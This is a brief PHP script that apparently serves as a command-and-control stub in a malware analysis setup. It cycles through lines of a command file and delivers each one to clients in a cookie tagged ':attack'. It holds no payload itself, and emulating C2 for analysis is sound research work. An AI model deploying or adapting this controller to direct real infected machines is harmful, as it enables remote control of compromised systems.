<?php
  function get_token() {
    $fp2 = fopen("/var/www/html/server/value.txt",'rb');
    $data = 1 + fgets($fp2);
    fclose($fp2);
    $fp2 = fopen("/var/www/html/server/value.txt","wb");
    fputs($fp2, $data."\n");
    fclose($fp2);
    return $data;
  }


  $command = 'None';
  $fp = fopen("/home/analysis/tools/c2-command/stage3-command.txt",'rb');
  $cmd_array = [];
  while(($buffer = fgets($fp, 4096)) !== false) {
    if(strlen($buffer) > 1) {
      if($buffer[0] != '#') {
        $cmd_array[]=$buffer;
      }
    }
  }
  $idx = 0;
  $cnt = count($cmd_array);
  if($cnt !== 0) {
    $idx = get_token() % $cnt;
    $command = trim($cmd_array[$idx]);
  }
  setcookie('response', "$command:attack",
            time() + 86400, '/', 'vcs.gtisc.gatech.edu');
  echo $command;
?>
